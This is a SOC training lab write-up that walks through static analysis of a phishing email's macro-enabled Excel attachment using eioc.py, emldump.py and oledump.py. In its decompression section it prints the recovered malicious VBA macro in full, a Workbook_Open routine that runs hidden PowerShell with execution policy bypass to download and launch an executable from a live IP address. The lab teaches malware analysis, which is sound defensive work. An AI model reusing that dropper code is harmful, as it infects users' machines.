# Performing Static MalDoc (Malicious Office Document) Analysis

## Scenario
Your SOC team received a ticket for a suspicious email reported by an employee. The email contains an attachment—a Microsoft Excel document—that appears to be part of a phishing attempt. Your goal is to analyze the email to determine if the attached document is malicious and to identify any Indicators of Compromise (IoCs). 

In this scenario, you will explore analysis techniques for identifying malicious Microsoft Office documents (MalDocs) without executing them. You'll learn how to safely enumerate and extract attachments from emails, examine the document's OLE (Object Linking and Embedding) structure, and perform static analysis to detect malware artifacts and uncover embedded payloads or macros.

The email can be found in this directory, named `Invoice.eml`. A preview of the email in the Mozilla Thunderbird email client can be seen here:

![Due Invoide Payment email excerpt](https://github.com/user-attachments/assets/34574d8f-83f0-4edb-84cd-f77419cad46a)

As we can see above, the email references a document for confirmation which has been attached to the email as `invoice_11-2024.xlsm`. An `.xlsm` file is a type of **Microsoft Excel** file that supports macros. The file extension ".xlsm" stands for Excel Macro-Enabled Workbook. Unlike regular `.xlsx` files, which are standard Excel workbooks *without* macros, `.xlsm` files can contain embedded macros—small programs written in VBA (Visual Basic for Applications) that can automate tasks or, in some cases, execute malicious code if crafted by an attacker.

## MalDocs
As previously mentioned, a MalDoc (Malicious Document) is a document file, often in Microsoft Office formats like Word (`.doc`, `.docx`) or Excel (`.xls`, `.xlsm`), that has been crafted or modified to deliver malware. MalDocs are a common tool in phishing and social engineering attacks because they leverage macros, scripts, or embedded objects to execute malicious code on a target's machine.

![Record macros icon in Excel](https://github.com/user-attachments/assets/f68ca02a-6040-49ff-8de6-753f762b7484)

Attackers often use MalDocs to weaponize malware because PDFs and Office documents are commonly shared and sent within legitimate business operations. By riding the wave of trust placed in these commonly exchanged file formats, attackers increase the likelihood that recipients will open the document and enable any embedded macros, unknowingly executing the malicious code. Additionally, MalDocs can often evade weak email security filter detections and bypass basic file extension allow lists, making them an attractive choice to deliver payloads over email.

## Email Attachments

Email attachments are files sent alongside the email, which can range from documents (Office documents, PDFs, etc.) to images (JPGs, PNGs, etc.) or compressed archives (`.zip` files, etc.). These files are typically encoded within the email as a **base64** encoded string, depending on the encoding method used, to ensure safe transport across different email clients and systems.

If we were to open up the `Invoice.eml` file in a text editor, we'll find that the attachment has been embedded at the bottom of the email file. 

In this lab, we'll learn how to extract and analyze these attachments to assess them for potential malware. Through various email headers, such as the `Content-Type`, the `Content-Transfer-Encoding`, and the `Content-Disposition`, we can infer that the email attachment is titled `invoice_11-2024.xlsm` and has been encoded using `base64`. 

These are the same headers that an email client would check in order to display a preview of the file in the client or browser.

![The attachment section of an EML file](https://github.com/user-attachments/assets/2c1ccde5-8bb9-44d7-8294-b26558b112f8)

There are several ways to extract attachments from an email for analysis, such as saving it locally from an email client, downloading it from a ticketing system in the case of a phishing investigation, or using scripts to directly dump the attachment. Each approach has its pros and cons.

In some cases, it's best—or not even necessary—to write the attachment to disk to perform a basic reputation analysis.

### eioc.py
This leads us into tools like `eioc.py`, which is a [Python script](https://github.com/MalwareCube/Email-IOC-Extractor) designed to aid in email forensic analysis by extracting various components from email files such as IP addresses, URLs, headers, and attachment metadata.

If we run `eioc.py` against an email, it will provide us with several pieces of parsed and extracted indicators like IP addresses and important email headers, including the filenames and cryptographic hash values of any attachments.

To perform this, we can simply use Python to call the `eioc.py` script, which is located in the `Tools` directory, and provide it the `Invoice.eml` file:

```
python3 Tools/eioc.py Invoice.eml
```
![The output of eioc.py](https://github.com/user-attachments/assets/2d7a1926-513d-4556-bd9a-4207b4123a55)

And with a single command, we've extracted the MD5, SHA1, and SHA256 hash values of the document without even writing it to disk, minimizing the risk of accidental clicks or execution.

We can now take any of these hash values and perform a reputation lookup by checking its hash against threat intelligence databases to determine if the file is known to be malicious.

For example, if we head over to [VirusTotal](https://virustotal.com), we can search for the file's MD5 hash `3064726b643cf933c803d572ae56e925`: 

![Virustotal submission page](https://github.com/user-attachments/assets/a45255d2-c395-4d5c-929c-73670dff4c93)

Upon doing so, we will quickly discover that this file was flagged as malicious by almost 40 security vendors, all claiming that the file is some kind of **trojan downloader**.

![Virustotal results page](https://github.com/user-attachments/assets/7aa13121-9974-4cea-8ec7-ed2cb07dbaaa)

## Extracting Email Attachments
In some cases, we may still need to extract the attachment from an email in order to perform static and dynamic malware analysis. With an attachment safely extracted, an analyst can perform static analysis to inspect the file's structure, metadata, and embedded objects, as well as dynamic analysis by safely executing the file in a controlled environment to observe its behavior.

### emldump.py
One useful tool for extracting email attachments is `emldump.py`, developed by [Didier Stevens](https://github.com/DidierStevens/DidierStevensSuite/tree/master). This script is designed to parse email files and extract the attachments without having to open them in an email client. It also can allow us to automate the process of attachment extraction, making it easier to handle larger volumes of suspicious emails at once.

To safely extract the Excel document from the email, we can simply run `emldump.py` and point it to the email in question:

```
python3 Tools/emldump.py Invoice.eml
```

This command extracts the content of the `.eml` file and displays its multipart structure in the form of various streams or indexes. Interestingly, the fourth stream (`4:`) is labeled `invoice_11-2024.xlsm`. The `application/octet-stream` MIME type typically indicates a binary file, which in this case is a Microsoft Excel file with macros enabled, and its size is 736,278 bytes.

![emldump.py output](https://github.com/user-attachments/assets/7d46de52-eaf0-470d-a31f-5dea674674e9)

Now that we know the correct stream we want to extract, we can run the command again to select it using the `-s 4` argument (to indicate the fourth stream), along with `-d` to dump the file to disk. If we run this as is, the contents of the file will be dumped to the terminal. Instead, we want to direct the output to its own file using the `>` operator:

```
python3 Tools/emldump.py Invoice.eml -s 4 -d > invoice_11-2024.xlsm
```
![emldump.py output](https://github.com/user-attachments/assets/4c572896-ea83-4641-a42b-02134d2436ff)

To further verify we've extracted the correct file, we can run `md5sum` against the file and compare it to our output from `eioc.py`:

```
md5sum invoice_11-2024.xlsm
```
![md5sum output](https://github.com/user-attachments/assets/a3944768-b417-4cae-b43f-a463f6535d4b)

And we have a match!

Now that we've successfully extracted the suspicious attachment, let's turn to understanding the structure of Office documents and how we can analyze them for potential malware.

## Object Linking and Embedding (OLE)
OLE (Object Linking and Embedding) is a technology developed by Microsoft that allows embedding and linking to documents and objects within other documents. It enables applications like Microsoft Word, Excel, and PowerPoint to link or embed content from other files, such as images, charts, or other documents.

Office documents, such as Excel files (`.xlsm`), are structured using the OLE format, which stores data and objects in streams. By examining the structure of these documents, we can identify embedded macros, hidden scripts, or other potential indicators of compromise.

### oledump.py 
Another useful Python-based tool developed by [Didier Stevens](https://github.com/DidierStevens/DidierStevensSuite/tree/master) is `oledump.py`. OLEDump is often used in malware analysis and digital forensics to examine the internal structure of Office files. While there's a lot we can do with it (see the `-h` menu for all of its features), we will keep it simple and attempt to extract the contents of any embedded macros.

First, we can simply run the `oledump.py` script against the invoice file that we've already extracted:

```
python3 Tools/oledump.py invoice_11-2024.xlsm
```
![oledump.py output](https://github.com/user-attachments/assets/00f3de12-892d-4541-aa6b-dc35067d991e)

Similar to `emldump.py`, OLEDump breaks the file down into individual streams based on the OLE structure.

`A: xl/vbaProject.bin` refers to the VBA (Visual Basic for Applications) project file stored within the Excel document, which contains the macros and code that can be executed when the document is opened.

It appears that there are a number of entries related to the project file, sheets, and workspaces - however, one entry that stands out is `A4: M 634 'VBA/ThisWorkbook'` due to the capital `M` indicator in the second column. The letter M next to stream 4 indicates that the stream contains VBA macros, which is exactly what we're looking to analyze.

### Select Stream
Now that we know which stream contains a macro (the fourth stream), we can select it using the `-s 4` argument. Upon doing so, you'll notice it returns a long table of (at first) seemingly random characters:

```
python3 Tools/oledump.py invoice_11-2024.xlsm -s 4
```

![oledump.py output](https://github.com/user-attachments/assets/e769dbcf-4d5b-44e6-9177-539b21f409b2)

The result we get from `oledump.py` is essentially a hexadecimal dump of the raw contents of that stream, displaying the embedded VBA macros and related data (additional properties or objects). To break down the different columns that are returned:

- The **leftmost column** shows the offset values in hexadecimal, which represent the position of the data within the stream. For example, the first row has the offset `00000000`, which means the data in that row starts at the very beginning of the stream.

- The **middle column** contains the hexadecimal representation of the raw byte data at each offset. Each byte is displayed as a two-digit hexadecimal value (e.g., `01`, `76`, `B2`, etc.).

- The **rightmost column** contains the ASCII (human-readable) representation of the hexadecimal data from the middle column. This is useful because it helps to identify any readable strings or keywords embedded in the binary data, such as file names, function names, variables or other relevant keywords.

For example, as we scroll through the ASCII output, we can make out certain fragments like `pow.ers..-Win@dowSty.Rh.idden` or `I.nvoke-We.bRequest. -Uri`, hinting that this macro might contain some PowerShell commands. 

### Strings Dump
To look into these interesting keywords further, we can use the `-S` operator with `oledump.py` to return any human-readable string values from the VBA macro's contents. This is just like running the `strings` command in the terminal against a file to search for sequences of printable characters, typically ASCII or Unicode:

```
python3 Tools/oledump.py invoice_11-2024.xlsm -s 4 -S
```

![oledump.py output](https://github.com/user-attachments/assets/a140b419-d160-4f87-87ea-600618d5bf90)

Although the output is still a bit unclear, we can start to make out hints to more of these keywords like:
- `-WindowStyle Hidden`: This flag tells PowerShell to run the script in the background without displaying a window. While used in legitimate PowerShell scripts, it can also be used to execute a malicious script silently.
- `-ExecutionPolicy Bypass`: This flag instructs PowerShell to bypass any security policies set on the system that would normally prevent the execution of scripts. 
- `Invoke-WebRequest`: This command in PowerShell is used to send HTTP or HTTPS requests to a specified URL, often to download files or retrieve data from a remote server. Often MalDocs that contain VBA macros act as a "dropper" that, once executed, will fetch or "drop" additional malware onto the system.

Interestingly, we can even start to make out a URL and IP address as potential Indicators of Compromise (IoCs):

```
http://3
.73.132.
53/hz/Et
olfsojm.
```
However, we can take this one step further.

### VBA Decompression
Finally, we can attempt to use the decompression features of `oledump.py` to extract the full contents of the macro. To do so, we simply replace `-S` with `--vbadecompresscorrupt`:

```
python3 Tools/oledump.py invoice_11-2024.xlsm -s 4 --vbadecompresscorrupt
```

![oledump.py output](https://github.com/user-attachments/assets/925dbc71-8ec3-4353-bc84-27e801ed1286)

Upon doing so, we return the complete output of the malicious VBA script embedded into the document and we can now analyze the code to understand what it is doing. At a high level, the macro leverages PowerShell to act as a dropper when the workbook is opened, it downloads and executes a malicious file from the internet.

**To understand it in more detail:**

The code begins with the `Workbook_Open()` subroutine, which is triggered when the workbook is opened:

```
Private Sub Workbook_Open()
```

It then defines a couple of variables, `sCommand` for the PowerShell command, and `sOutput` to store the output from the command execution:

```
Dim sCommand As String, sOutput As String
Dim oWshShell As Object, oWshShellExec As Object
```

The `sCommand` variable is assigned a PowerShell command string. This command performs several actions, starting with setting the execution policy to bypass and running PowerShell with a hidden window (`-WindowStyle hidden`):

```
sCommand = "powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri ""http://3.73.132.53/hz/Etolfsojm.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

The specific PowerShell command that gets executed then: 

1. Creates a temporary file with an `.exe` extension.
2. Uses `Invoke-WebRequest` to download a file named `Etolfsojm.exe` from `http://3.73.132.53/hz/`.
3. Executes the downloaded executable with `Start-Process`.

## Conclusion

Great work! We were able to securely extract the attachment from the email and use basic static analysis techniques to parse through the OLE objects. By doing so, we were able to understand the true nature of the document's embedded macro and document a number of malicious indicators.

We can even go as far as submitting the URL we identified in the macro against malware databases - again, by using [VirusTotal](https://virustotal.com):

![Virustotal submission page](https://github.com/user-attachments/assets/fb9d237e-2daa-49e7-bd4d-ded0cb27e4e3)

Upon doing so, we will quickly discover that this URL was flagged as malicious by 10 or so security vendors, further supporting our findings that this email was a phishing attempt.

![Virustotal results page](https://github.com/user-attachments/assets/46b0756b-06ec-4682-9b1e-f329a26cccbd)


## Indicators of Compromise (IoCs)
It's always a good idea to document the malicious artifacts we gathered during our investigation. Below, I have done so in *defanged* format. Defanging is a way to alter potentially dangerous URLs, IP addresses, and file paths to prevent them from being clickable or accidentally executed.

### Email Address
- `Paol[.]Reggiani@moss[.]it`

### Files
- `invoice_11-2024[.]xlsm`
  - MD5: `3064726b643cf933c803d572ae56e925`
  - SHA1: `af73eee09bfe11fe8475aec38d7742215432b063`
  - SHA256: `7637a06005c3e90cedae65054c0458d02a66865e1f91c61b5b7ba1ccf3303587`
- `Etolfsojm[.]exe`

### IP Addresses
- `3[.]73[.]132[.]53`
- `213[.]227[.]154[.]65`

### URLs
- `hxxp[://]3[.]73[.]132[.]53/hz/Etolfsojm[.]exe`

## TCM Security - Promo Code
![TCM Security logo](https://github.com/user-attachments/assets/90283a54-d164-4990-a09b-4edb84ac661e)

If you enjoyed this scenario and lesson, be sure to check out TCM Security's [Security Operations (SOC) 101](https://academy.tcm-sec.com/p/security-operations-soc-101), a 30+ hour training course that dives deep into Phishing Analysis, Network Traffic Analysis, Endpoint Detection and Response, Log Analysis and Management, Security Information and Event Management (SIEM), Threat Intelligence, and DFIR operations. 😎🛡️

🚨 Use the limited time promo code `BSIDESOTTAWA` to save 50% off the TCM Academy! :)
